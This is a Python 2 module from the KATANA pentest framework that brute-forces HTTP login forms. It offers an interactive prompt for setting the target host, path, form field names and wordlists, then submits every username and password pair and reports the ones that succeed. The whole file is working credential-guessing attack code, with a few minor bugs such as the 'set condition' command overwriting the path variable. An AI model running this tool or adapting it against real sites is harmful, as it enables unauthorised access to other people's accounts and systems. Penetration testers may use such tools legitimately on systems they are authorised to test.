# KATANA
# Brute Force Form Base HTTP
# Script by RedToor
# 28/02/2015
import httplib,urllib
import socket
import sys
from core import help
W  = '\033[0m'  
R  = '\033[31m' 
G  = '\033[32m' 
O  = '\033[33m' 
B  = '\033[34m' 
P  = '\033[35m' 
C  = '\033[36m' 
GR = '\033[37m'
defaulthost="127.0.0.1"
defaultport="80"
defaultpach="/admin/login.php"
defaultdic1="core/db/user.dicc"
defaultdic2="core/db/pass.dicc"
defaultdat1="username"
defaultdat2="password"
defaultmeth="POST"
defaultcont="no"
def httpformbasebruteforce():
	global defaulthost,defaultport,defaultpach,defaultdic1,defaultdic2,defaultdat1,defaultdat2,defaultmeth
	actions = raw_input(B+"   web/formbt > "+W)
	if actions == "show options":
		print "     ["+R+"+"+W+"] options"
		print "     target         : yes"
		print "     port           : no/yes"
		print "     patch          : yes"
		print "     params         : yes"
		print "     condition      : yes"
		print "     dictionaries   : no/yes\n"
		print "     ["+G+"+"+W+"] options current"
		print "     target         : ",defaulthost
		print "     port           : ",defaultport
		print "     patch          : ",defaultpach
		print "     param_1        : ",defaultdat1
		print "     param_2        : ",defaultdat2  
		print "     method         : ",defaultmeth
		print "     if!=condition  : ",defaultcont
		print "     dictionary_1   : ",defaultdic1
		print "     dictionary_2   : ",defaultdic2
		httpformbasebruteforce()
	elif actions=="back":
		return 
	elif actions=="exit":
		print C+"   GooD"+W+" bye."
		exit()
	elif actions[0:10] == "set target":
			defaulthost = actions[11:]
			defaulthost = defaulthost.replace("http://", "")
			print "     target         : "+defaulthost+" "+O+"     Saved!!!"+W
			httpformbasebruteforce()
	elif actions[0:8] == "set port":
			defaultport = actions[9:]
			print "     port           : "+defaultport+" "+O+"     Saved!!!"+W
			httpformbasebruteforce()
	elif actions[0:9] == "set patch":
			defaultpach = actions[10:]
			print "     patch          : "+defaultpach+" "+O+"     Saved!!!"+W
	elif actions[0:13] == "set condition":
			defaultpach = actions[14:]
			print "     condition      : "+defaultcont+" "+O+"     Saved!!!"+W
			httpformbasebruteforce()
	elif actions[0:16] == "set dictionary_1":
			defaultdic1 = actions[17:]
			print "     dictionary_1   : "+defaultdic1+" "+O+"     Saved!!!"+W
			httpformbasebruteforce()
	elif actions[0:16] == "set dictionary_2":
			defaultdic2 = actions[17:]
			print "     dictionary_2   : "+defaultdic2+" "+O+"     Saved!!!"+W
			httpformbasebruteforce()
	elif actions[0:11] == "set param_1":
			defaultdat1 = actions[12:]
			print "     param_1        : "+defaultdat1+" "+O+"     Saved!!!"+W
			httpformbasebruteforce()
	elif actions[0:11] == "set param_2":
				defaultdat2 = actions[12:]
				print "     param_2        : "+defaultdat2+" "+O+"     Saved!!!"+W
				httpformbasebruteforce()
	elif actions[0:10] == "set method":
			defaultmeth = actions[11:]
			print "     method         : "+defaultmeth+" "+O+"     Saved!!!"+W
			httpformbasebruteforce()
	elif actions == "help":
		help.help()
	elif actions == "run":
		print("\n     ["+O+"!"+W+"] Checking target")
		print "     ["+G+"+"+W+"] options current"
		print "     target         : ",defaulthost
		print "     port           : ",defaultport
		print "     patch          : ",defaultpach
		print "     param_1        : ",defaultdat1
		print "     param_2        : ",defaultdat2  
		print "     if!=condition  : ",defaultcont
		print "     method         : ",defaultmeth
		print "     dictionary_1   : ",defaultdic1
		print "     dictionary_2   : ",defaultdic2
		print  
		try:
			red=socket.socket(socket.AF_INET, socket.SOCK_STREAM)       
			red.connect((defaulthost, int(defaultport))) 
			if True:
				print("     ["+G+"+"+W+"] target LIVE")
				print("     ["+G+"+"+W+"] Running")
				try:
					with open(defaultdic1,'r') as user:
						for us in user: 
							with open(defaultdic2,'r') as passs:
								for ps in passs:
									us=us.replace("\n","")
									ps=ps.replace("\n","")
									params = urllib.urlencode({defaultdat1: us, defaultdat2: ps})
									header={"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
									conn = httplib.HTTPConnection(defaulthost,defaultport)
									conn.request(defaultmeth, defaultpach, params, header)
									response = conn.getresponse()
									ver_source = response.read()
									if ver_source.find(defaultcont)<= 0:
										print "     ["+G+"+"+W+"] SUCCESSFUL with "+defaultdat1+" : "+us+" , "+defaultdat2+" : "+ps
										httpformbasebruteforce()
									else:
										print "     ["+O+"!"+W+"] Checking with "+defaultdat1+" : "+us+" , "+defaultdat2+" : "+ps	
				except(KeyboardInterrupt, SystemExit):
					print("\n   ["+O+"!"+W+"] (Ctrl + C) Detected, System Exit")
		except:
			print("     ["+R+"-"+W+"] target DEAD")
	httpformbasebruteforce()